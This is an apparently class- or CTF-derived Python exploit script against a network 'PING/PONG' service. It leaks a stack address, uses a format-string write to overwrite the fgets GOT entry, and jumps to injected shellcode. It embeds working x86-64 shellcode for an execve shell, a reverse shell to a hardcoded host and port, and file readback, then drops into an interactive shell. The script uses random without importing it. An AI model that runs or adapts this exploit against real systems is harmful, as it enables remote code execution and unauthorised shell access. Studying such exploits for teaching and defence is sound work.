
#!/usr/bin/python

import struct
import socket
import sys
import time
import binascii
import os
import math
import md5
import re
import hashlib
import telnetlib
import base64

alphanum = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

def rnd_string(sz):
   res = ''
   for i in xrange(sz):
      res += alphanum[random.randrange(0, len(alphanum))]
   return res

def p(f, *args):
   return struct.pack(f, *args)

def u(f, v):
   return struct.unpack(f, v)

def hx(s):
   return binascii.hexlify(s)

def ux(s):
   return binascii.unhexlify(s)

def readUntil(s, content, echo = True):
   x = ""
   while True:
      y = s.recv(1)
      if not y:
         return False
      x += y
      for v in content:
         if x.endswith(v):
            if echo:
               sys.stderr.write(x)
            return x

def ru(s, txt):
   return readUntil(s, [txt])

def rl(s):
  return ru(s, '\n')

def interact(s):
   t = telnetlib.Telnet()
   t.sock = s
   t.interact()

if len(sys.argv) != 4:
   print "usage: python prog.py <ip> <port> <-b(ash), -r(reverse), -f(ile_readback)>"
   sys.exit(0)

_fgets = 0x601048 #_fgets GOT
offset = 119	#adjust tgt to land in NOP sled


tgthost = sys.argv[1]
tgtport = int(sys.argv[2])

shellcode = ""



target = (tgthost, tgtport)

s = socket.socket()
s.connect(target)

#Bash Shellcode == 30 Bytes
bash = "\x48\x31\xc0\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

##Rev shellcode (192.168.16.153:57281):
reverse = "\x55\x48\x89\xe5\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\x48\x83\xec\x08\xc7\x04\x24\x02\x00\xdf\xc1\xc7\x44\x24\x04\xc0\xa8\x10\x99\x48\x8d\x34\x24\x48\x83\xc4\x08\x5b\x48\x31\xdb\x6a\x10\x5a\x6a\x03\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\x31\xf6\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05"


# file readback
file_readback ="\x4d\x31\xff\x68\x6b\x65\x79\x00\x48\x89\xe7\x48\x31\xf6\x48\x89\xf2\x48\x31\xc0\xb8\x02\x00\x00\x00\x0f\x05\x49\x89\xc7\x4c\x89\xff\x48\x8d\x74\x24\xff\xba\x01\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\x48\x83\xf8\x01\x75\x1e\xbf\x01\x00\x00\x00\x48\x8d\x74\x24\xff\xba\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x48\x83\xf8\x01\x75\x02\xeb\xc8\xbf\x00\x00\x00\x00\xb8\x3c\x00\x00\x00\x0f\x05"

flag = sys.argv[3]

if flag == "-b":
  shellcode = bash
elif flag == "-r":
  shellcode = reverse
elif flag == "-f":
  shellcode = file_readback
else:
  print "Need a flag"


nop = ""
nop += "\x90"

nl = ""
nl += "\x0a"

# Send "PING " + "
s.send("PING " + "%7$p" + nl)
ru(s, "PONG 0x")

#strfmt is 72 bytes for the overwriting addr + 48 bytes for addr being overwritten (6x8-byte chunks) = 150 bytes to get past fmt+addrs (18$)+8nops

leak = int(rl(s).strip(), 16) #ONLY the leak addr
print "Buffer Leak: 0x%x" % leak

#######################################
#REMEMBER THE 200 OK PONG STRING (-12)#
#######################################

tgt = leak + offset #leak is from 7$, offset is difference between that addr and my NOPs. 
print "Target Address: 0x%x" % tgt

bytes = p("<Q", tgt)[:6] #just the six bytes of address (upper two are 0s)

# Generate format string to overwrite GOT
total = 12 # byte counter (bytes written so far)
idx = 18 #From class: 72 bytes to get through string; 72/8=9...8$+9$=17$+5 bytes for PING_, pad to 80.
fmt = '' #starts with empty string and appends each loop
for b in bytes:
	value = ord(b) #takes char and gives ascii value
	#print value
	need = (value -total) & 0xff  # how many chars needed to write, given how many so far -- but never more than 256 chars (0xff makes sure it's 0-255)
	#print "need: ", need
	fmt += "%%%dc" % need  # %% = percent in tgt string, %d is 'need', c is the format ("%123c")
	fmt += "%%%d$hhn" % idx # need to index to one of six pointers in memory, no width can be wider than 3. Takes 12 chars for each addr byte: "%234c%XX$hhn" -> 12x6=72/8 == 9 arguments.  17$ will be the first argument.
	idx += 1 # adjust the $ to move to the next address ptr (+8 bytes in the stack)
	total += need
	#print "total: ", total

fmt = fmt.ljust(75, 'A') #Pad with As to 75 (9 bytes) accounting for PING_

# Add address of _fgets() GOT, byte by byte (upper two bytes are already \x00\x00)
for i in range(6):
	fmt += p("<Q", _fgets + i)
print fmt
#print "\\x".join("{:02x}".format(ord(c)) for c in fmt)

# Send shellcode
s.send("PING " + fmt + nop*8 + shellcode + nl)

# Once you have a shell on some socket s, maybe that's the
# same socket at above, maybe it's a new socket, then interact
# will use telnetlib to handle the asynchronous I/O needed to
# interact with your shell

interact(s)


